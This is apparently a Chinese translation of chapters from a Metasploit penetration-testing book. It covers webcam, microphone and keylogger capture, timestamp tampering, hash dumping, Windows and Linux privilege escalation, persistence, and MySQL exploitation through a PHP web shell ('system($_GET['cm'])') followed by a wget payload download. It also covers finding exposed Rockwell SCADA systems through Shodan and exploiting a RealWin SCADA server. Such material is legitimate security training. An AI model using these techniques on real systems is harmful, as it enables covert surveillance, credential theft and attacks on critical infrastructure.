Metasploit 具有`desktop`命令，例如枚举桌面、从网络摄像头拍照、从麦克风录音、从摄像头流式传输等等。我们可以如下所示查看可用的功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00151.jpeg)

使用`enumdesktops`和`getdesktop`可以破坏与目标桌面相关的信息。`enumdesktop`命令列出所有可用的桌面，而`getdesktop`列出与当前桌面相关的信息。

# 屏幕截图和摄像头枚举

在进行屏幕截图、网络摄像头快照、运行实时流或记录按键日志之前，测试人员必须事先获得许可。然而，我们可以使用`snapshot`命令通过拍摄快照来查看目标的桌面，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00269.jpeg)

查看保存的 JPEG 文件，我们有以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00126.jpeg)

让我们看看我们是否可以枚举摄像头并查看谁正在系统上工作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00054.jpeg)

使用`webcam_list`命令，我们可以找出与目标关联的摄像头数量。让我们使用`webcam_stream`命令来流式传输摄像头，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00104.jpeg)

发出上述命令会在浏览器中打开一个网络摄像头流，如截图所示。我们也可以选择通过发出`webcam_snap`命令来进行快照，而不是流式传输，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00106.jpeg)

哈哈哈！嗯，我会说这是一种避免在线侵入的方法。然而，有时，如果在执法机构工作，您可能会被要求监听环境以进行监视。为了实现这一点，我们可以使用`record_mic`命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00152.jpeg)

我们可以使用`record_mic`命令通过传递秒数来设置捕获的持续时间。从目标获取的另一个有趣的信息是他们的按键日志。我们可以使用`keyscan_start`命令启动键盘嗅探模块来转储按键日志，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00150.jpeg)

几秒钟后，我们可以使用`keyscan_dump`命令转储按键日志，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00157.jpeg)

在本节中我们看到了许多命令。现在让我们进入后期利用的高级部分。

# 使用 Metasploit 进行高级后期利用

在本节中，我们将利用从基本命令中收集的信息来在目标系统中取得进一步的成功和访问级别。

# 迁移到更安全的进程

正如我们在前一节中看到的，我们的 meterpreter 会话是从临时文件加载的。然而，如果目标系统的用户发现进程异常，他可以终止进程，这将使我们退出系统。因此，迁移到更安全的进程，如`explorer.exe`或`svchost.exe`，可以通过使用`migrate`命令来逃避受害者的注意。然而，我们始终可以使用`ps`命令来找出我们要跳转到的进程的 PID，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00236.jpeg)

我们可以看到`explorer.exe`的 PID 是`1896`。让我们使用`migrate`命令跳转到它，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00111.jpeg)

我们可以看到我们成功地跳转到了`explorer.exe`进程。

从一个进程迁移到另一个进程可能会降低特权。

# 获取系统特权

如果我们侵入的应用程序以管理员特权运行，通过发出`getsystem`命令很容易获得系统级特权，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00058.jpeg)

系统级特权提供了最高级别的特权，能够在目标系统上执行几乎任何操作。

`getsystem`模块在较新版本的 Windows 上不太可靠。建议尝试本地特权升级方法和模块来提升权限

# 使用 timestomp 更改访问、修改和创建时间

Metasploit 被广泛应用，从私人组织到执法部门。因此，在进行隐秘行动时，强烈建议您更改文件访问、修改或创建的日期。在 Metasploit 中，我们可以使用`timestomp`命令执行时间更改操作。在上一节中，我们创建了一个名为`creditcard.txt`的文件。让我们使用`timestomp`命令更改它的时间属性，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00245.jpeg)

我们可以看到访问时间是 2016-06-19 23:23:15。我们可以使用`-z`开关将其修改为`1999-11-26 15:15:25`，如前面的截图所示。让我们看看文件是否被正确修改了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00165.jpeg)

我们成功地改变了`creditcard.txt`文件的时间戳。我们还可以使用`-b`开关来清除文件的所有时间细节，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00183.jpeg)

使用`timestomp`命令，我们可以单独更改修改的访问和创建时间。

# 使用 hashdump 获取密码哈希

一旦我们获得了系统特权，我们可以通过发出`hashdump`命令来快速找出受损系统的登录密码哈希，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00217.jpeg)

一旦我们找到了密码哈希，我们就可以对目标系统发动哈希传递攻击。

有关哈希传递攻击的更多信息，请参阅[`www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/`](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)。

您可以参考一个很好的视频，解释了哈希传递攻击及其缓解方法，网址为[`www.youtube.com/watch?v=ROvGEk4JG94`](https://www.youtube.com/watch?v=ROvGEk4JG94)。

# Metasploit 和特权升级

在本节中，我们将看看如何使用 Metasploit 在目标系统上获得最高级别的特权。我们瞄准的大多数应用程序都在用户级别特权上运行，这为我们提供了一般访问权限，但并非完全系统访问权限。然而，要获得系统级别的访问权限，我们需要在获得系统访问权限后利用目标系统中的漏洞来提升权限。让我们看看如何在接下来的章节中实现对各种类型操作系统的系统级别访问权限。

# 在 Windows Server 2008 上提升权限

在渗透测试中，我们经常遇到有限的访问权限的情况，当运行诸如`hashdump`之类的命令时，我们可能会得到以下错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00256.jpeg)

在这种情况下，如果我们尝试使用`getsystem`命令获得系统特权，我们会得到以下错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00261.jpeg)

那么，在这种情况下我们应该怎么办呢？答案是利用后期渗透来提升权限，以实现最高级别的访问。以下演示是在 Windows Server 2008 SP1 操作系统上进行的，我们使用本地漏洞来绕过限制并完全访问目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00279.jpeg)

在前面的截图中，我们使用`exploit/windows/local/ms10_015_kitrap0d`漏洞来提升权限并获得最高级别的访问。让我们使用`getuid`命令检查访问级别，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00043.jpeg)

我们可以看到我们已经获得了系统级别的访问权限，现在我们可以在目标上执行任何操作。

有关 kitrap0d 漏洞的更多信息，请参阅[`technet.microsoft.com/en-us/library/security/ms10-015.aspx`](https://technet.microsoft.com/en-us/library/security/ms10-015.aspx)。

# 使用 Metasploit 在 Linux 上提升权限

我们在上一节中看到了如何使用 Metasploit 在基于 Windows 的操作系统上提升权限。现在让我们来看看手动运行特权升级漏洞。这个练习将帮助您为竞争和实际的信息安全认证考试做好准备。

假设我们已经在具有有限访问权限的 Linux UBUNTU 14.04 LTS 服务器上获得了一个 shell，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00136.jpeg)

让我们进入 shell，并通过发出`shell`命令获得更可靠的命令执行访问，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00259.jpeg)

正如你所看到的，我们在`shell`终端中发出了`id`命令；我们有当前用户的用户 ID，即 1000，用户名为 rootme。通过使用`uname -a`命令收集有关内核的更多信息，我们可以看到操作系统的内核版本是 3.13.0-24，发布年份是 2014 年，机器正在运行 64 位操作系统。

在找到这些细节并浏览互联网之后，我们发现了来自[`www.exploit-db.com/exploits/37292`](https://www.exploit-db.com/exploits/37292)的*Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Privilege Escalation Exploit (CVE:2015-1328)*。接下来，我们下载了基于 C 的漏洞利用，并将其托管在我们的本地机器上，以便我们可以将这个漏洞利用传输到目标机器。由于我们已经可以访问目标上的 shell，我们可以只需发出`wget`命令，然后是托管在我们机器上的原始 C 漏洞利用源文件的位置，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00143.jpeg)

我们的下一个任务是编译这个漏洞并在目标上运行它。要编译漏洞，我们输入`GCC`，然后是源文件的名称，同时使用`-o`开关指定输出名称。由于我们在漏洞中使用了 pthread 调用，我们还将提供`-lpthread`开关。发出完整的命令，我们可以看到漏洞被编译为名为 bang 的文件。通过发出`chmod +x bang`命令，我们给 bang 文件分配执行权限，并运行漏洞，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00076.jpeg)

是的！当发出`whoami`命令时，系统告诉我们我们是 root。换句话说，我们已经获得了对目标的最高可能访问权限，可能现在对服务器有更多的访问权限。

有关 CVE 2015-1328 的更多信息，请参阅[`seclists.org/oss-sec/2015/q2/717`](http://seclists.org/oss-sec/2015/q2/717)。

# 使用 Metasploit 实现持久访问

在成为执法机构的一部分时，获得对目标系统的持久访问是很重要的。然而，在传统的渗透测试中，除非可测试的环境非常庞大并且需要很多天才能完成测试，否则持久性可能并不是非常实际的。但这并不意味着不值得知道如何保持对目标的访问。在接下来的部分中，我们将介绍一些可以用来保持对目标系统访问的持久性技术。此外，Metasploit 已经废弃了 meterpreter 中用于保持对目标访问的持久性和`metsvc`模块。让我们介绍一下实现持久性的新技术。

# 在基于 Windows 的系统上实现持久访问

在这个例子中，我们已经获得了对运行 Windows Server 2012 R2 的系统的 meterpreter 访问。让我们使用`background`命令将 meterpreter 移到后台，并使用最新的持久性模块，即`post/windows/manage/persistence_exe`。这个模块的美妙之处在于它不依赖于 Metasploit，这意味着你可以使用任何可执行文件来实现持久性。让我们使用`use`并运行`show options`来检查我们需要设置的所有选项，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00079.jpeg)

我们可以看到有四个选项。REXENAME 是将加载到受害系统上的`.exe`文件的名称。REXEPATH 是我们系统上可执行文件的路径，将上传到目标并重命名为 REXENAME 上设置的值。SESSION 选项将包含用于将文件上传到目标的 meterpreter 的会话标识符。STARTUP 选项将包含来自 USER、SYSTEM、SERVICE 的值之一。在有限访问用户的情况下，我们将在 STARTUP 选项中保持 USER，持久性将仅在该特定用户登录时实现。通过将 STARTUP 的值设置为 SYSTEM，可以在任何用户登录时实现持久性。但是，要在 SYSTEM 级别实现持久性，将需要管理员特权，SERVICE 安装也是如此。因此，我们将保持它为 USER。

对于 REXEPATH，我们使用`msfvenom`创建了一个后门，这是一个针对基于 Windows 的系统的 meterpreter，就像我们在之前的章节中所做的那样。让我们将`SESSION`选项设置为`3`，因为我们的 meterpreter 会话 ID 是`3`，如下屏幕所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00228.jpeg)

接下来，让我们将`REXEPATH`设置为我们可执行文件的路径，并按以下方式运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00251.jpeg)

运行模块，我们可以看到已经实现了持久性。让我们通过设置处理程序来测试一下，以适应我们的`nj.exe`文件，它连接回端口`1337`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00264.jpeg)

在前面的案例中，我们通过 meterpreter 向受害者提供了重启命令，导致系统重新启动。接下来，我们迅速设置了一个处理程序，以在端口`1337`上接收传入的 meterpreter 会话，并且一旦我们运行了`exploit`命令，重新启动的系统就连接到了我们的 meterpreter，这表明成功地实现了对目标系统的持久性。

# 在 Linux 系统上获得持久访问

要在 Linux 系统上实现持久性，我们可以在获得初始 meterpreter 访问后使用`exploit/linux/local/cron_persistence`模块，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00084.jpeg)

接下来，我们需要将`SESSION`选项设置为我们的 meterpreter 会话标识符，并配置`USERNAME`为目标机器的当前用户，并按以下方式运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00057.jpeg)

一旦实现了基于 Cron 的持久性，您可以设置一个处理程序来接收类似于我们在 Windows 系统中使用的方法的传入 meterpreter 会话。但是，Linux 操作系统的有效载荷将是`linux/x86/meterpreter/reverse_tcp`。我把这个练习留给你们完成，因为没有比自主学习更好的培训了。

有关 Cron 持久性的更多信息，请参考[`www.rapid7.com/db/modules/exploit/linux/local/cron_persistence`](https://www.rapid7.com/db/modules/exploit/linux/local/cron_persistence)。

# 总结

在本章中，我们涵盖了很多内容。我们从学习基本的后渗透开始，然后转向高级后渗透。我们还涵盖了迁移、获取系统特权、时间戳和获取哈希。我们还看到了如何使用 Metasploit 进行特权升级，并在 Linux 和 Windows 系统上保持访问。

在本章中，您有许多练习要完成。但是，如果您想尝试更多，请尝试执行以下任务：

+   尝试在各种系统上进行特权升级，包括 Windows Server 2003、Windows XP、Windows 7、Windows 8.1 和 Windows 10。注意差异，并保持一个用于在这些系统上提升特权的模块列表。

+   安装两到三年前的 Red Hat、CentOS 和 Ubuntu 操作系统副本，找出内核版本，并尝试在这些机器上提升特权。

+   找出在 OSX、BSD 和 Solaris 操作系统上获得持久性的方法。

在第五章中，*使用 Metasploit 测试服务*，我们将研究如何使用 Metasploit 测试服务。我们的重点将放在可能作为整个项目而不是 VAPT 参与的一部分的服务上。


# 第五章：使用 Metasploit 测试服务

现在让我们谈谈测试各种专门的服务。很可能在我们作为渗透测试人员的职业生涯中，我们会遇到一个只需要在特定服务器上执行测试的公司或可测试环境，而这个服务器可能运行数据库、VoIP 或 SCADA 控制系统等服务。在本章中，我们将探讨在执行这些服务的渗透测试时使用的各种开发策略。在本节中，我们将涵盖以下几点：

+   进行数据库渗透测试

+   ICS 的基础知识及其关键性质

+   了解 SCADA 的利用

+   测试互联网协议语音服务

基于服务的渗透测试需要出色的技能和对我们可以成功利用的服务的深入了解。因此，在本章中，我们将探讨进行高效的基于服务的测试所面临的理论和实际挑战。

# 使用 Metasploit 测试 MySQL

众所周知，Metasploit 支持 Microsoft 的 SQL 服务器的广泛模块。但是，它也支持其他数据库的许多功能。我们在 Metasploit 中有许多其他数据库的模块，支持流行的数据库，如 MySQL、PostgreSQL 和 Oracle。在本章中，我们将介绍用于测试 MySQL 数据库的 Metasploit 模块。

如果你经常遇到 MSSQL，我在*精通 Metasploit*图书系列中已经介绍了使用 Metasploit 进行 MSSQL 测试。

请参考*精通 Metasploit*图书系列中的 MSSQL 测试：

[`www.packtpub.com/networking-and-servers/mastering-metasploit-second-edition`](https://www.packtpub.com/networking-and-servers/mastering-metasploit-second-edition)

因此，让我们进行端口扫描，看看数据库是否在 IP 地址`172.28.128.3`上运行，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00087.jpeg)

我们可以清楚地看到我们打开了端口 3306，这是 MySQL 数据库的标准端口。

# 使用 Metasploit 的 mysql_version 模块

让我们使用`auxiliary/scanner/mysql`中的`mysql_version`模块来指纹识别 MySQL 实例的版本，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00083.jpeg)

我们可以看到我们在目标上运行的是 MYSQL 5.0.51a-3ubuntu5。

# 使用 Metasploit 对 MySQL 进行暴力破解

Metasploit 为 MySQL 数据库提供了很好的暴力破解模块。让我们使用`mysql_login`模块开始测试凭据，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00154.jpeg)

我们可以设置所需的选项，即`RHOSTS`为目标的 IP 地址，然后将`BLANK_PASSWORDS`设置为 true，然后简单地`run`模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00175.jpeg)

我们可以看到数据库正在以 root 用户和空密码运行。在进行现场 VAPT 时，您经常会遇到许多使用默认凭据运行的数据库服务器。在接下来的几节中，我们将使用这些凭据来收集有关目标的更多详细信息。

# 使用 Metasploit 查找 MySQL 用户

Metasploit 提供了一个`mysql_hashdump`模块，用于收集 MySQL 数据库的其他用户的用户名和密码哈希等详细信息。让我们看看如何使用这个模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00110.jpeg)

我们只需要设置`RHOSTS`；我们可以跳过设置密码，因为它是空的。让我们`run`模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00114.jpeg)

我们可以看到有四个其他用户，只有用户 admin 受到密码保护。此外，我们可以复制哈希并将其运行到密码破解工具中，以获得明文密码。

# 使用 Metasploit 转储 MySQL 模式

我们还可以使用`mysql_schemadump`模块转储整个 MySQL 模式，如下屏幕所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00097.jpeg)

我们将`USERNAME`和`RHOSTS`选项分别设置为`root`和`172.28.128.3`，然后运行模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00270.jpeg)

我们可以看到我们已成功将整个模式转储到`/root/msf/loot`目录中，如前面的屏幕截图所示。转储模式将为我们提供更好的表视图和目标上运行的数据库类型，并且还将有助于构建精心制作的 SQL 查询，我们将在短时间内看到。

# 使用 Metasploit 在 MySQL 中进行文件枚举

Metasploit 提供了`mysql_file_enum`模块来查找目标上存在的目录和文件。该模块帮助我们弄清目录结构和目标端运行的应用程序类型。让我们看看如何运行这个模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00187.jpeg)

首先，我们需要设置 USERNAME、RHOSTS 和 FILE_LIST 参数，以使该模块在目标上运行。

`FILE_LIST` 选项将包含我们想要检查的目录列表的路径。我们在`/root/desktop/`创建了一个简单的文件，名为 file，并在其中放入了三个条目，即/var、/var/www 和/etc/passwd。让我们运行模块并分析结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00068.jpeg)

我们可以看到我们检查的所有目录都存在于目标系统上，从而为我们提供了目录结构和目标端关键文件的更好视图。

# 检查可写目录

Metasploit 还提供了一个`mysql_writable_dirs`模块，用于查找目标上的可写目录。我们可以通过将 DIR_LIST 选项设置为包含目录列表的文件，以及设置 RHOSTS 和 USERNAME 选项的方式来运行此模块，就像我们之前使用其他模块一样，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00105.jpeg)

设置所有选项，让我们在目标上运行模块并分析结果，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00138.jpeg)

我们可以看到，在`/var/www/html`中，`/tmp/`目录是可写的。我们将看看如何在短时间内利用可写目录。

# 使用 Metasploit 进行 MySQL 枚举

Metasploit 中还存在一个用于详细枚举 MySQL 数据库的特定模块。`auxiliary/admin/mysql/mysql_enum`模块单独为许多模块提供了大量信息。让我们使用这个模块来获取有关目标的信息，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00144.jpeg)

设置`RHOSTS`、`USERNAME`和`PASSWORD`（如果不为空）选项，我们可以像前面的屏幕截图所示的那样运行模块。我们可以看到模块已经收集了各种信息，例如服务器主机名、数据目录、日志状态、SSL 信息和权限，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00177.jpeg)

已经收集了关于数据库的足够信息，让我们在下一节中还执行一些有趣的 SQL 查询。

# 通过 Metasploit 运行 MySQL 命令

现在我们已经获得了关于数据库模式的信息，我们可以使用`auxiliary/admin/mysql/mysql_sql`模块运行任何 SQL 命令，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00206.jpeg)

通过设置 SQL 选项提供 SQL 命令，我们可以在目标上运行任何 MySQL 命令。但是，我们显然还需要设置`RHOST`、`USERNAME`和`PASSWORD`选项。

# 通过 MySQL 获得系统访问权限

我们刚刚看到了如何通过 MySQL 运行 SQL 查询。让我们运行一些有趣且危险的查询，以获取对机器的完全访问权限，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00240.jpeg)

在前面的屏幕截图中，我们将 SQL 选项设置为 select "<?php phpinfo() ?>" INTO OUTFILE "/var/www/html/a.php"命令，并针对目标运行了模块。此命令将文本<?php phpinfo() ?>写入名为 a.php 的文件，路径为/var/www/html/a.php。我们可以通过浏览器确认模块的成功执行，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00255.jpeg)

太棒了！我们已成功在目标上写入文件。让我们通过将`<?php system($_GET['cm']);?>`字符串写入同一目录中的另一个名为`b.php`的文件来增强这个攻击向量。一旦写入，该文件将使用`cm`参数接收系统命令，并使用 PHP 中的系统函数执行它们。让我们按照以下方式发送这个命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00241.jpeg)

为了避免双引号，我们将在 SQL 命令中使用反斜杠。

运行模块，我们现在可以通过浏览器验证`b.php`文件的存在，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00146.jpeg)

我们可以看到，将系统命令（例如`cat/etc/password`）作为`b.php`文件的参数输出`/etc/passwd`文件的内容到屏幕上，表示成功的远程代码执行。

为了获得系统访问权限，我们可以快速生成一个 Linux meterpreter 有效载荷，并像在前几章中那样将其托管在我们的机器上。让我们通过提供`wget`命令，后跟我们有效载荷的路径和`cm`参数，将我们的 meterpreter 有效载荷下载到目标，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00172.jpeg)

我们可以通过发出`ls`命令来验证文件是否成功下载到目标位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00189.jpeg)

是的，我们的文件已成功下载。让我们按照以下方式提供必要的权限：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00230.jpeg)

我们对`29.elf`文件执行了`chmod 777`，如前面的屏幕截图所示。我们需要为 Linux meterpreter 设置一个处理程序，就像我们之前的例子一样。但是，在执行命令来执行二进制文件之前，请确保处理程序正在运行。让我们通过浏览器执行二进制文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00252.jpeg)

是的！我们已经获得了对目标的 meterpreter 访问，并且现在可以执行我们选择的任何后期利用功能。

对于除 root 之外的特权用户，我们可以在使用`chmod`命令时使用`+x`而不是`777`。

有关测试 MSSQL 数据库的更多信息，请参阅书籍《精通 Metasploit》的*第五章*。

始终记录在整个渗透测试过程中在服务器上留下的所有后门，以便在参与结束时可以进行适当的清理。

# SCADA 的基础知识

**监控和数据采集**（**SCADA**）用于控制大坝、电网站、炼油厂、大型服务器控制服务等活动。

SCADA 系统是为非常具体的任务而构建的，例如控制分派水的水平、管理天然气管道、控制电力网格以监视特定城市的电力以及各种其他操作。

# 在 SCADA 系统中分析安全性

在本节中，我们将讨论如何突破 SCADA 系统的安全性。我们有很多框架可以测试 SCADA 系统，但讨论它们将使我们超出本书的范围。因此，简单起见，我们将限制我们的讨论仅限于使用 Metasploit 进行 SCADA 利用。

# 测试 SCADA 的基础知识

让我们了解如何利用 SCADA 系统的基础知识。SCADA 系统可以使用 Metasploit 中最近添加到框架中的各种漏洞进行攻击。此外，一些位于 SCADA 服务器上的默认用户名和密码可能是默认的；这在当今很少见，但仍然可能存在用户名和密码在目标服务器上未更改的可能性。

让我们尝试找到一些 SCADA 服务器。我们可以通过使用一个很好的资源[`www.shodanhq.com`](http://www.shodanhq.com)来实现这一点：

1.  首先，我们需要为 Shodan 网站创建一个帐户。

1.  注册后，我们可以在我们的帐户中轻松找到 Shodan 服务的 API 密钥。获取 API 密钥后，我们可以通过 Metasploit 搜索各种服务。

1.  让我们尝试使用`auxiliary/gather/shodan_search`模块找到配置了 Rockwell Automation 技术的 SCADA 系统。

1.  在`QUERY`选项中，我们将只输入`Rockwell`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00265.jpeg)

1.  我们将`SHODAN_APIKEY`选项设置为我们 Shodan 账户中找到的 API 密钥。让我们将`QUERY`选项设置为`Rockwell`并分析结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00263.jpeg)

正如我们清楚地看到的，我们使用 Metasploit 模块找到了许多在互联网上运行 Rockwell Automation 的 SCADA 服务的系统。

# 基于 SCADA 的利用

在过去几年中，SCADA 系统的被利用率比以往任何时候都要高。SCADA 系统可能受到各种漏洞的影响，如基于堆栈的溢出、整数溢出、跨站脚本和 SQL 注入。

此外，这些漏洞的影响可能对生命和财产造成危险，正如我们之前讨论的那样。黑客攻击 SCADA 设备可能的原因主要是因为 SCADA 开发人员和操作人员在编程系统时没有关注安全性，以及使用的操作程序不足。

让我们看一个 SCADA 服务的例子，并尝试使用 Metasploit 进行利用。但是，请不要随意选择 Shodan 上的主机并尝试利用它。SCADA 系统非常关键，可能导致严重的监禁时间。无论如何，在以下示例中，我们将使用 Metasploit 在基于 Windows XP 系统的 DATAC RealWin SCADA Server 2.0 系统上进行利用。

该服务在端口 912 上运行，该端口对 sprintf C 函数的缓冲区溢出存在漏洞。sprintf 函数在 DATAC RealWin SCADA 服务器的源代码中用于显示从用户输入构造的特定字符串。当攻击者滥用这个有漏洞的函数时，可能会导致目标系统被完全攻陷。

让我们尝试使用`exploit/windows/scada/realwin_scpc_initialize`利用来利用 DATAC RealWin SCADA Server 2.0 系统。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00267.jpeg)

我们将`RHOST`设置为`192.168.10.108`，`payload`设置为`windows/meterpreter/bind_tcp`。DATAC RealWin SCADA 的默认端口是`912`。让我们利用目标并检查我们是否可以`exploit`这个漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00272.jpeg)

哇！我们成功地利用了目标。让我们使用`load`命令加载`mimikatz`扩展，以找到系统的明文密码，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00275.jpeg)

我们可以看到，通过发出`kerberos`命令，我们可以找到明文密码。

我们在 Metasploit 中有很多专门针对 SCADA 系统漏洞的利用。要了解有关这些漏洞的更多信息，您可以参考网络上关于 SCADA 黑客和安全的最佳资源[`www.scadahacker.com`](http://www.scadahacker.com)。您应该能够在[`scadahacker.com/resources/msf-scada.html`](http://scadahacker.com/resources/msf-scada.html)的*msf-scada*部分下找到许多列出的利用。

网站[`www.scadahacker.com`](http://www.scadahacker.com)在过去几年中一直在维护着各种 SCADA 系统中发现的漏洞列表。这个列表的美妙之处在于它提供了关于 SCADA 产品、产品供应商、系统组件、Metasploit 参考模块、披露细节以及第一个 Metasploit 模块披露日期的精确信息。

# 实施安全的 SCADA

当实际应用时，保护 SCADA 是一项艰巨的工作；然而，当保护 SCADA 系统时，我们可以寻找以下一些关键点：

+   密切关注对 SCADA 网络的每一次连接，并查明是否有任何未经授权的尝试访问系统

+   确保在不需要时断开所有网络连接，并且如果 SCADA 系统是空气隔离的，那么最终连接到它的任何其他端点都必须以相同的方式进行安全和审查

+   实施系统供应商提供的所有安全功能

+   为内部和外部系统实施 IDPS 技术，并应用 24 小时的事件监控

+   记录所有网络基础设施，并为管理员和编辑分配个人角色

+   建立 IR 团队和蓝队来识别对一个

定期

# 限制网络

在未经授权访问、不需要的开放服务等攻击事件发生时，可以限制网络连接。通过删除或卸载服务来实施这一解决方案是对各种 SCADA 攻击的最佳防御。

SCADA 系统部署在 Windows XP 系统上，这显著增加了攻击面。如果您正在应用 SCADA 系统，请确保您的 Windows 系统是最新的，以防止更常见的攻击。

# 测试互联网协议语音服务

现在让我们专注于测试**互联网协议语音**（**VoIP**）启用的服务，并看看我们如何检查可能影响 VoIP 服务的各种缺陷。

# VoIP 基础知识

与传统电话服务相比，VoIP 是一种成本更低的技术。VoIP 在电信方面比传统电话更加灵活，并提供各种功能，如多个分机、来电显示服务、日志记录、每通电话的录音等。一些公司现在在 IP 电话上有他们的**私有分支交换**（**PBX**）。

传统的电话系统仍然容易通过物理访问进行窃听，如果攻击者改变电话线的连接并连接他们的发射器，他们将能够使用他们的设备拨打和接听电话，并享受互联网和传真服务。

然而，在 VoIP 服务的情况下，我们可以在不进入线路的情况下破坏安全。然而，如果您对其工作原理没有基本的了解，攻击 VoIP 服务是一项繁琐的任务。本节介绍了我们如何在网络中破坏 VoIP 而不拦截线路。

此外，在托管服务类型的 VoIP 技术中，客户端处没有 PBX。然而，客户端处的所有设备通过互联网连接到服务提供商的 PBX，即通过使用 IP/VPN 技术使用**会话初始协议**（**SIP**）线路。

让我们看看以下图表如何解释这项技术：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00155.jpeg)

互联网上有许多 SIP 服务提供商为软电话提供连接，可以直接使用以享受 VoIP 服务。此外，我们可以使用任何客户端软电话来访问 VoIP 服务，如 Xlite，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00006.gif)

# 指纹识别 VoIP 服务

